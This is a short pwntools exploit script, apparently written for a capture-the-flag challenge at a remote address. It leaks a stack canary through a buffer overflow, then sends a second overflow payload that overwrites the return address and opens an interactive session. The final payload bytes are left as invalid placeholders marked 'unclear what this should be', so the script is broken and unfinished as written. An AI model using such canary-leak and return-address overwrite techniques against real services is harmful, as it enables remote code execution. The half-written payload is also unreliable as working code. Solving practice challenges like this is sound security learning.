#!/usr/bin/env python3

from pwn import *
import struct
import os

context.log_level = "debug"
elf = ELF("./challenge", checksec=False)
context.binary = elf

#p = elf.process()
p = remote("34.125.199.248", 5674)

p.sendline(str(32).encode())
p.readuntil(b"> ")
p.send(b"A" * 32)
p.readuntil(b"Ok... its name is ")
p.read(32)

canary = p.read(8)
log.success(canary.hex())

p = remote("34.125.199.248", 5674)
p.sendline(str(0x38 + 2).encode())

p.readuntil(b"> ")

payload = b""
payload += b"B" * 32
payload += canary
payload += b"\x00" * 16
payload += b"\x??\x??" # unclear what this should be
p.send(payload)

p.interactive()
